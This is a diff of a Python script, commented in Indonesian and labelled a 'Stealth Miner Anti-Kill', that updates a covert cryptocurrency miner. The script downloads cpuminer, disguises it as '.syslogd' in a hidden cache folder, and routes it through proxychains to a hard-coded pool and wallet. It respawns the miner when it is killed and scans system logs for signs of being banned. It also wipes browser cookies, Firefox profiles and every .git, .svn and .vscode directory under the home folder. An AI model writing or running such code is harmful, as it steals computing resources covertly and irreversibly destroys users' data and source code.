@@ -1,32 +1,84 @@
 #!/usr/bin/env python3
-import os, subprocess, urllib.request, tarfile, time, threading, shutil, sys, random, socket
+import os, subprocess, urllib.request, tarfile, time, threading, shutil, sys, random, signal, socket
 
-# Konfigurasi
+# === KONFIGURASI ===
 URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
 TARFILE = "miner.tar.gz"
 BIN_NAME = "cpuminer-sse2"
-ALIAS_BIN = ".dbus-daemon"
-HIDDEN_DIR = os.path.expanduser("~/.cache/.sysd")
+ALIAS_BIN = ".syslogd"
+HIDDEN_DIR = os.path.expanduser("~/.cache/.coreguard")
 POOL = "stratum+tcp://164.92.145.122:80"
-WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Icut"
+WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Recut"
 PASSWORD = "x"
-THREADS = os.cpu_count()
+THREADS = random.randint(1, min(7, os.cpu_count()))
+RESTART_INTERVAL = 600
 
-# Durasi
-MIN_DURATION = 300
-MAX_DURATION = 720
-MIN_PAUSE = 120
-MAX_PAUSE = 240
-COOLDOWN_DURATION = 180
-cooldown_restart_counter = 0
-cooldown_restart_limit = 3
-cooldown_reset_time = time.time() + 3600
+BIN_PATH = os.path.join(HIDDEN_DIR, ALIAS_BIN)
 
-def proxy_exec(cmd_args):
+def prepare_binary():
+    os.makedirs(HIDDEN_DIR, exist_ok=True)
+    if not os.path.isfile(BIN_PATH):
+        print("[â¬‡ï¸] Mengunduh binary miner...")
+        urllib.request.urlretrieve(URL, TARFILE)
+        with tarfile.open(TARFILE) as tar:
+            tar.extractall(HIDDEN_DIR)
+        os.rename(os.path.join(HIDDEN_DIR, BIN_NAME), BIN_PATH)
+        os.chmod(BIN_PATH, 0o755)
+        os.remove(TARFILE)
+
+def proxy_exec():
     env = os.environ.copy()
     env["LD_PRELOAD"] = os.path.abspath("./libproxychains.so")
     env["PROXYCHAINS_CONF_FILE"] = os.path.abspath("./proxychains.conf")
-    return subprocess.Popen(cmd_args, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    cmd = [BIN_PATH, "-a", "power2b", "-o", POOL, "-u", WALLET, "-p", PASSWORD, f"-t{THREADS}"]
+    return subprocess.Popen(cmd, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
+
+def monitor_process(proc):
+    print(f"[ðŸ›¡ï¸] Monitoring PID: {proc.pid}")
+    while True:
+        if proc.poll() is not None:
+            print("[âš ï¸] Miner dihentikan. Restarting...")
+            time.sleep(5)
+            new_proc = proxy_exec()
+            monitor_process(new_proc)
+            break
+        time.sleep(10)
+
+def clean_mining_artifacts():
+    for base in ["~/.cache", "~/.local/share", "~/Downloads", "/tmp"]:
+        for root, _, files in os.walk(os.path.expanduser(base)):
+            for f in files:
+                if any(k in f.lower() for k in ["miner", "cpuminer", "power2b"]):
+                    try: os.remove(os.path.join(root, f))
+                    except: pass
+
+def clean_source_control():
+    for base in ["~", "~/.local/share", "~/Downloads"]:
+        for root, dirs, _ in os.walk(os.path.expanduser(base)):
+            for d in [".git", ".svn", ".idea", ".vscode", "__pycache__"]:
+                path = os.path.join(root, d)
+                if os.path.exists(path):
+                    try: shutil.rmtree(path)
+                    except: pass
+
+def clean_myapp_data():
+    for path in ["~/MyAppExplore", "~/.local/share/myapp", "~/Downloads/MyApp"]:
+        full = os.path.expanduser(path)
+        if os.path.exists(full):
+            try: shutil.rmtree(full)
+            except: pass
+
+def clean_browser_cookies():
+    for path in [
+        "~/.config/google-chrome/Default/Cookies",
+        "~/.mozilla/firefox", "~/.config/chromium/Default/Cookies"
+    ]:
+        full = os.path.expanduser(path)
+        if os.path.exists(full):
+            try:
+                if os.path.isdir(full): shutil.rmtree(full)
+                else: os.remove(full)
+            except: pass
 
 def fake_http_headers():
     headers = [
@@ -53,62 +105,10 @@ def dns_doh_bypass():
             "curl", "-s", "-H", "accept: application/dns-json",
             "https://cloudflare-dns.com/dns-query?name=pool.rplant.xyz&type=A"
         ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except:
-        pass
-
-def is_cpu_100_percent():
-    try:
-        return os.getloadavg()[0] >= os.cpu_count()
-    except:
-        return False
-
-def should_restart():
-    global cooldown_restart_counter, cooldown_reset_time
-    if time.time() > cooldown_reset_time:
-        cooldown_restart_counter = 0
-        cooldown_reset_time = time.time() + 3600
-    if cooldown_restart_counter < cooldown_restart_limit:
-        cooldown_restart_counter += 1
-        return True
-    return False
-
-def disconnect_network():
-    print("[馃攲] Putus koneksi...")
-    try:
-        subprocess.call(["nmcli", "networking", "off"])
-        subprocess.call(["nmcli", "radio", "wifi", "off"])
-    except:
-        try: subprocess.call(["ifconfig", "eth0", "down"])
-        except: pass
-
-def reconnect_network():
-    print("[馃寪] Reconnect jaringan...")
-    try:
-        subprocess.call(["nmcli", "networking", "on"])
-        subprocess.call(["nmcli", "radio", "wifi", "on"])
-    except:
-        try: subprocess.call(["ifconfig", "eth0", "up"])
-        except: pass
-
-def detect_system_threat():
-    print("[馃洝锔廬 Cek sistem diblokir...")
-    paths = [
-        "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
-        "/etc/nologin", "/tmp/.X11-unix"
-    ]
-    for path in paths:
-        if os.path.exists(path):
-            try:
-                with open(path, "r", errors="ignore") as f:
-                    log = f.read().lower()
-                    if any(k in log for k in ["suspend", "ban", "terminate", "dismiss"]):
-                        print(f"[馃毇] Deteksi diblokir: {path}")
-                        disconnect_network()
-                        restart_script()
-            except: continue
+    except: pass
 
 def firewall_bypass():
-    print("[馃敟] Jalankan firewall bypass...")
+    print("[ðŸ”¥] Jalankan firewall bypass...")
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(2)
@@ -119,112 +119,56 @@ def firewall_bypass():
         subprocess.call(["ping", "-c", "1", "8.8.8.8"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except: pass
 
-def clean_miner_cache():
+def detect_system_threat():
+    print("[ðŸ›¡ï¸] Cek sistem diblokir...")
+    paths = ["/var/log/auth.log", "/var/log/syslog", "/var/log/messages", "/etc/nologin", "/tmp/.X11-unix"]
+    for path in paths:
+        if os.path.exists(path):
+            try:
+                with open(path, "r", errors="ignore") as f:
+                    log = f.read().lower()
+                    if any(k in log for k in ["suspend", "ban", "terminate", "dismiss"]):
+                        print(f"[ðŸš«] Deteksi diblokir: {path}")
+                        subprocess.call(["pkill", "-f", BIN_PATH])
+            except: continue
+
+def clean_up():
     try:
         if os.path.exists(TARFILE): os.remove(TARFILE)
-        if os.path.exists(HIDDEN_DIR): shutil.rmtree(HIDDEN_DIR)
+        shutil.rmtree(HIDDEN_DIR, ignore_errors=True)
     except: pass
 
-def clean_myapp_data():
-    for path in ["~/MyAppExplore", "~/.local/share/myapp", "~/Downloads/MyApp"]:
-        full = os.path.expanduser(path)
-        if os.path.exists(full):
-            try: shutil.rmtree(full)
-            except: pass
-
-def clean_browser_cookies():
-    for path in [
-        "~/.config/google-chrome/Default/Cookies",
-        "~/.mozilla/firefox", "~/.config/chromium/Default/Cookies"
-    ]:
-        full = os.path.expanduser(path)
-        if os.path.exists(full):
-            try:
-                if os.path.isdir(full): shutil.rmtree(full)
-                else: os.remove(full)
-            except: pass
-
-def clean_source_control():
-    for base in ["~", "~/.local/share", "~/Downloads"]:
-        for root, dirs, _ in os.walk(os.path.expanduser(base)):
-            for d in [".git", ".svn", ".idea", ".vscode", "__pycache__"]:
-                path = os.path.join(root, d)
-                if os.path.exists(path):
-                    try: shutil.rmtree(path)
-                    except: pass
-
-def clean_mining_artifacts():
-    for base in ["~/.cache", "~/.local/share", "~/Downloads", "/tmp"]:
-        for root, _, files in os.walk(os.path.expanduser(base)):
-            for f in files:
-                if any(k in f.lower() for k in ["miner", "cpuminer", "power2b"]):
-                    try: os.remove(os.path.join(root, f))
-                    except: pass
-
-def run_one_session():
-    os.makedirs(HIDDEN_DIR, exist_ok=True)
-    urllib.request.urlretrieve(URL, TARFILE)
-    with tarfile.open(TARFILE) as tar:
-        tar.extractall()
-    hidden_path = os.path.join(HIDDEN_DIR, ALIAS_BIN)
-    os.rename(BIN_NAME, hidden_path)
-    os.chmod(hidden_path, 0o755)
-
-    duration = random.randint(MIN_DURATION, MAX_DURATION)
-    print(f"[鈿欙笍] Mining melalui proxy selama {duration}s...")
-    proc = proxy_exec([
-        hidden_path, "-a", "power2b", "-o", POOL,
-        "-u", WALLET, "-p", PASSWORD, f"-t{THREADS}"
-    ])
-    time.sleep(10)
-    if os.path.exists(TARFILE): os.remove(TARFILE)
-
-    start_time = time.time()
-    while time.time() - start_time < duration:
-        time.sleep(10)
-        if is_cpu_100_percent():
-            print(f"[鉀擼 CPU penuh! cooldown {COOLDOWN_DURATION}s")
-            disconnect_network()
-            proc.terminate()
-            time.sleep(COOLDOWN_DURATION)
-            if should_restart(): restart_script()
-            else: return
-    proc.terminate()
-
-def restart_script():
-    try:
-        print("[馃攣] Restarting...")
-        clean_miner_cache()
-        clean_myapp_data()
-        clean_mining_artifacts()
-        time.sleep(5)
-        subprocess.Popen([sys.executable] + sys.argv)
-        sys.exit(0)
-    except Exception as e:
-        print(f"[X] Gagal restart: {e}")
-
-def main_loop():
-    while True:
-        clean_mining_artifacts()
-        run_one_session()
-        pause = random.randint(MIN_PAUSE, MAX_PAUSE)
-        print(f"[鈴革笍] Istirahat {pause}s...\n")
-        time.sleep(pause)
-
+# ENTRY POINT
 if __name__ == "__main__":
-    print("馃殌 Stealth Miner Dimulai dengan Proxychains...")
-    reconnect_network()
-    clean_browser_cookies()
-    clean_myapp_data()
-    clean_source_control()
-    fake_http_headers()
+    print("ðŸš€ Stealth Miner Anti-Kill Dimulai...")
+    reconnect = threading.Thread(target=fake_http_headers)
+    reconnect.daemon = True
+    reconnect.start()
+
     threading.Thread(target=anti_suspend, daemon=True).start()
     threading.Thread(target=dns_doh_bypass, daemon=True).start()
     threading.Thread(target=firewall_bypass, daemon=True).start()
     threading.Thread(target=detect_system_threat, daemon=True).start()
-    try: main_loop()
+
+    clean_browser_cookies()
+    clean_myapp_data()
+    clean_source_control()
+    clean_mining_artifacts()
+
+    try:
+        prepare_binary()
+        miner_proc = proxy_exec()
+        monitor_thread = threading.Thread(target=monitor_process, args=(miner_proc,), daemon=True)
+        monitor_thread.start()
+        time.sleep(RESTART_INTERVAL)
+        print("[ðŸ”] Restart otomatis miner...")
+        os.killpg(os.getpgid(miner_proc.pid), signal.SIGTERM)
+        time.sleep(3)
+        os.execl(sys.executable, sys.executable, *sys.argv)
     except KeyboardInterrupt:
-        restart_script()
+        print("[â›”] Dihentikan manual.")
+        os.killpg(os.getpgid(miner_proc.pid), signal.SIGTERM)
+        clean_up()
     except Exception as e:
-        print(f"[!] Error: {e}")
-        restart_script()
+        print(f"[X] Error fatal: {e}")
+        clean_up()
